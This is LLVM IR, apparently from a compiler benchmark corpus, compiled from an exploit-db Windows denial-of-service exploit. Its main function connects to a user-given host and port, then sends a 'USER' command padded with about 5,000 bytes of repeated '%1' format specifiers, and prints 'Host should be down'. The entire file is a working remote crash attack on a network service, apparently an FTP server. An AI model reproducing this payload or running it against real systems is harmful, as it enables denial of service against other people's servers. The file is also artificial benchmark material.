; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_3128.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_3128.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.hostent = type { i64 }
%struct.sockaddr_in = type { i8, %struct.in_addr, i32, i32 }
%struct.in_addr = type { i32 }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [27 x i8] c"[+] Usage: %s <ip> <port>\0A\00", align 1
@.str.1 = private unnamed_addr constant [29 x i8] c"[+] Connecting to %s:%s ... \00", align 1
@.str.2 = private unnamed_addr constant [41 x i8] c"Failed\0A[-] Could not init gethostbyname\0A\00", align 1
@PF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [25 x i8] c"Failed\0A[-] Socket error\0A\00", align 1
@.str.4 = private unnamed_addr constant [54 x i8] c"Failed\0A[-] Sorry, cannot connect to %s:%s. Error: %i\0A\00", align 1
@.str.5 = private unnamed_addr constant [4 x i8] c"OK\0A\00", align 1
@.str.6 = private unnamed_addr constant [26 x i8] c"[+] Building payload ... \00", align 1
@.str.7 = private unnamed_addr constant [3 x i8] c"%1\00", align 1
@.str.8 = private unnamed_addr constant [6 x i8] c"USER \00", align 1
@.str.9 = private unnamed_addr constant [4 x i8] c"\0D\0A\00\00", align 1
@.str.10 = private unnamed_addr constant [25 x i8] c"OK\0A[+] Sending USER ... \00", align 1
@.str.11 = private unnamed_addr constant [27 x i8] c"Failed\0A[-] Could not send\0A\00", align 1
@.str.12 = private unnamed_addr constant [25 x i8] c"[+] Host should be down\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca %struct.hostent*, align 8
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [1024 x i8], align 16
  %11 = alloca [5003 x i8], align 16
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 5000, i32* %12, align 4
  %14 = load i32, i32* %4, align 4
  %15 = icmp ne i32 %14, 3
  br i1 %15, label %16, label %21

16:                                               ; preds = %2
  %17 = load i8**, i8*** %5, align 8
  %18 = getelementptr inbounds i8*, i8** %17, i64 0
  %19 = load i8*, i8** %18, align 8
  %20 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str, i64 0, i64 0), i8* %19)
  store i32 1, i32* %3, align 4
  br label %124

21:                                               ; preds = %2
  %22 = call i32 (...) @WSACleanup()
  %23 = call i32 @MAKEWORD(i32 2, i32 0)
  %24 = call i32 @WSAStartup(i32 %23, i32* %8)
  %25 = load i8**, i8*** %5, align 8
  %26 = getelementptr inbounds i8*, i8** %25, i64 1
  %27 = load i8*, i8** %26, align 8
  %28 = load i8**, i8*** %5, align 8
  %29 = getelementptr inbounds i8*, i8** %28, i64 2
  %30 = load i8*, i8** %29, align 8
  %31 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.1, i64 0, i64 0), i8* %27, i8* %30)
  %32 = load i8**, i8*** %5, align 8
  %33 = getelementptr inbounds i8*, i8** %32, i64 1
  %34 = load i8*, i8** %33, align 8
  %35 = call %struct.hostent* @gethostbyname(i8* %34)
  store %struct.hostent* %35, %struct.hostent** %6, align 8
  %36 = icmp eq %struct.hostent* %35, null
  br i1 %36, label %37, label %39

37:                                               ; preds = %21
  %38 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.2, i64 0, i64 0))
  store i32 1, i32* %3, align 4
  br label %124

39:                                               ; preds = %21
  %40 = load i32, i32* @PF_INET, align 4
  %41 = load i32, i32* @SOCK_STREAM, align 4
  %42 = call i32 @socket(i32 %40, i32 %41, i32 0)
  store i32 %42, i32* %9, align 4
  %43 = icmp eq i32 %42, -1
  br i1 %43, label %44, label %46

44:                                               ; preds = %39
  %45 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.3, i64 0, i64 0))
  store i32 1, i32* %3, align 4
  br label %124

46:                                               ; preds = %39
  %47 = load i32, i32* @PF_INET, align 4
  %48 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 3
  store i32 %47, i32* %48, align 4
  %49 = load i8**, i8*** %5, align 8
  %50 = getelementptr inbounds i8*, i8** %49, i64 2
  %51 = load i8*, i8** %50, align 8
  %52 = call i32 @atoi(i8* %51)
  %53 = call i32 @htons(i32 %52)
  %54 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  store i32 %53, i32* %54, align 4
  %55 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  %56 = load %struct.hostent*, %struct.hostent** %6, align 8
  %57 = getelementptr inbounds %struct.hostent, %struct.hostent* %56, i32 0, i32 0
  %58 = load i64, i64* %57, align 8
  %59 = inttoptr i64 %58 to %struct.in_addr*
  %60 = bitcast %struct.in_addr* %55 to i8*
  %61 = bitcast %struct.in_addr* %59 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 4 %60, i8* align 4 %61, i64 4, i1 false)
  %62 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  %63 = call i32 @memset(i8* %62, i8 signext 0, i32 8)
  %64 = load i32, i32* %9, align 4
  %65 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %66 = call i32 @connect(i32 %64, %struct.sockaddr* %65, i32 4)
  %67 = icmp eq i32 %66, -1
  br i1 %67, label %68, label %77

68:                                               ; preds = %46
  %69 = load i8**, i8*** %5, align 8
  %70 = getelementptr inbounds i8*, i8** %69, i64 1
  %71 = load i8*, i8** %70, align 8
  %72 = load i8**, i8*** %5, align 8
  %73 = getelementptr inbounds i8*, i8** %72, i64 2
  %74 = load i8*, i8** %73, align 8
  %75 = call i32 (...) @WSAGetLastError()
  %76 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.4, i64 0, i64 0), i8* %71, i8* %74, i32 %75)
  store i32 1, i32* %3, align 4
  br label %124

77:                                               ; preds = %46
  %78 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.5, i64 0, i64 0))
  %79 = getelementptr inbounds [1024 x i8], [1024 x i8]* %10, i64 0, i64 0
  %80 = call i32 @memset(i8* %79, i8 signext 0, i32 1024)
  %81 = load i32, i32* %9, align 4
  %82 = getelementptr inbounds [1024 x i8], [1024 x i8]* %10, i64 0, i64 0
  %83 = call i32 @recv(i32 %81, i8* %82, i32 1024, i32 0)
  %84 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.6, i64 0, i64 0))
  store i32 0, i32* %13, align 4
  br label %85

85:                                               ; preds = %95, %77
  %86 = load i32, i32* %13, align 4
  %87 = load i32, i32* %12, align 4
  %88 = icmp slt i32 %86, %87
  br i1 %88, label %89, label %98

89:                                               ; preds = %85
  %90 = getelementptr inbounds [5003 x i8], [5003 x i8]* %11, i64 0, i64 0
  %91 = load i32, i32* %13, align 4
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds i8, i8* %90, i64 %92
  %94 = call i32 @memcpy(i8* %93, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.7, i64 0, i64 0), i32 2)
  br label %95

95:                                               ; preds = %89
  %96 = load i32, i32* %13, align 4
  %97 = add nsw i32 %96, 2
  store i32 %97, i32* %13, align 4
  br label %85

98:                                               ; preds = %85
  %99 = getelementptr inbounds [5003 x i8], [5003 x i8]* %11, i64 0, i64 0
  %100 = call i32 @memcpy(i8* %99, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.8, i64 0, i64 0), i32 5)
  %101 = getelementptr inbounds [5003 x i8], [5003 x i8]* %11, i64 0, i64 0
  %102 = load i32, i32* %12, align 4
  %103 = sext i32 %102 to i64
  %104 = getelementptr inbounds i8, i8* %101, i64 %103
  %105 = call i32 @memcpy(i8* %104, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.9, i64 0, i64 0), i32 3)
  %106 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.10, i64 0, i64 0))
  %107 = load i32, i32* %9, align 4
  %108 = getelementptr inbounds [5003 x i8], [5003 x i8]* %11, i64 0, i64 0
  %109 = getelementptr inbounds [5003 x i8], [5003 x i8]* %11, i64 0, i64 0
  %110 = call i32 @strlen(i8* %109)
  %111 = call i32 @send(i32 %107, i8* %108, i32 %110, i32 0)
  %112 = icmp eq i32 %111, -1
  br i1 %112, label %113, label %115

113:                                              ; preds = %98
  %114 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.11, i64 0, i64 0))
  store i32 1, i32* %3, align 4
  br label %124

115:                                              ; preds = %98
  %116 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.5, i64 0, i64 0))
  %117 = getelementptr inbounds [1024 x i8], [1024 x i8]* %10, i64 0, i64 0
  %118 = call i32 @memset(i8* %117, i8 signext 0, i32 1024)
  %119 = load i32, i32* %9, align 4
  %120 = getelementptr inbounds [1024 x i8], [1024 x i8]* %10, i64 0, i64 0
  %121 = call i32 @recv(i32 %119, i8* %120, i32 1024, i32 0)
  %122 = call i32 @Sleep(i32 1000)
  %123 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.12, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %124

124:                                              ; preds = %115, %113, %68, %44, %37, %16
  %125 = load i32, i32* %3, align 4
  ret i32 %125
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @WSACleanup(...) #1

declare dso_local i32 @WSAStartup(i32, i32*) #1

declare dso_local i32 @MAKEWORD(i32, i32) #1

declare dso_local %struct.hostent* @gethostbyname(i8*) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @atoi(i8*) #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #2

declare dso_local i32 @memset(i8*, i8 signext, i32) #1

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @WSAGetLastError(...) #1

declare dso_local i32 @recv(i32, i8*, i32, i32) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i32 @send(i32, i8*, i32, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @Sleep(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { argmemonly nounwind willreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
